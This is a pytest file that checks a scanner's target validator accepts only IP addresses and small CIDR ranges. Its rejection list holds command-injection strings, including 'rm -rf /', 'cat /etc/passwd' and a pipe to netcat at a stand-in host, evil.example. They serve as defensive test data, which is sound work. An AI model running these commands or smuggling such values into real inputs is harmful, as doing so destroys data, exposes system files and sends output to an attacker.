"""Target validation tests: authorized formats in, everything else out."""

import pytest

from app.services.target_validation import InvalidTargetError, validate_target


@pytest.mark.parametrize(
    "raw,expected",
    [
        ("127.0.0.1", "127.0.0.1"),
        ("  10.0.0.5  ", "10.0.0.5"),
        ("192.168.1.0/24", "192.168.1.0/24"),
        ("10.0.0.0/30", "10.0.0.0/30"),
        ("::1", "::1"),
        ("2001:db8::/120", "2001:db8::/120"),
    ],
)
def test_valid_targets_normalized(raw, expected):
    assert validate_target(raw) == expected


@pytest.mark.parametrize(
    "raw",
    [
        "",
        "   ",
        "example.com",
        "http://127.0.0.1/",
        "999.1.1.1",
        "1.2.3.4/33",
        "192.168.1.1/24",  # host bits set: not a network address
        "10.0.0.0/8",  # far too large for an inventory scan
        "10.0.0.0/15",  # just over the 256-address cap
        "127.0.0.1; rm -rf /",
        "127.0.0.1 && cat /etc/passwd",
        "127.0.0.1 | nc evil.example",
        "$(nmap 10.0.0.1)",
        "`id`",
        "-sS 127.0.0.1",
        "--top-ports 1000 127.0.0.1",
        "127.0.0.1\n evil",
        "nmap 127.0.0.1",
        "localhost",
        "x" * 65,
    ],
)
def test_invalid_targets_rejected(raw):
    with pytest.raises(InvalidTargetError):
        validate_target(raw)


@pytest.mark.parametrize("raw", [None, 123, ["127.0.0.1"], {"target": "127.0.0.1"}])
def test_non_string_targets_rejected(raw):
    with pytest.raises(InvalidTargetError):
        validate_target(raw)
